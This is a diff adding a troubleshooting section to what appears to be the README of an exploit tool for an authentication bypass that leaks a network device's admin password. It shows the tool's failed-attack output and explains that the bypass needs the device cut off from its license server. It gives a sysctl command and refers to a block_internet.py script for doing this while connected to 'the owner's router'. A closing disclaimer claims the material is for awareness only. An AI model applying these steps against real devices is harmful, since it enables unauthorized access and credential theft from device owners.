@@ -63,5 +63,21 @@ where `-t` is the target url. Here, we used `http://192.168.100.24` from the exa
 
 And then wait for it to spit out the admin password. 
 
+# What if:
+You received this error message:
+```
+[*] Targeting: http://10.0.0.1/admin/index?action=execute.js
+[*] Attempting Authentication Bypass (Fail-Open)...
+[-] Password leak failed.
+    Response snippet: Your radius+license is invalid ...
+    [!] Tip: This bypass relies on the device failing to contact the license server.
+    [!] Try blocking the device's WAN/Internet connection and run this again.
+```
+and look at the `Response snippet: Your radius+license is invalid ...`, it means it is still connected to the internet. If you are connected to the owner's router and then you are using Linux Distribution, use this command:
+```
+sudo sysctl -w net.ipv4.ip_forward=0
+```
+to disable forwarding of internet coming from your Linux into the LPB. This can hide the warning message `[!] WARNING: IP Forwarding is ENABLED on this machine!` if you executed `block_internet.py`.
+
 # Disclaimer
 This information you have seen today is for awareness only.
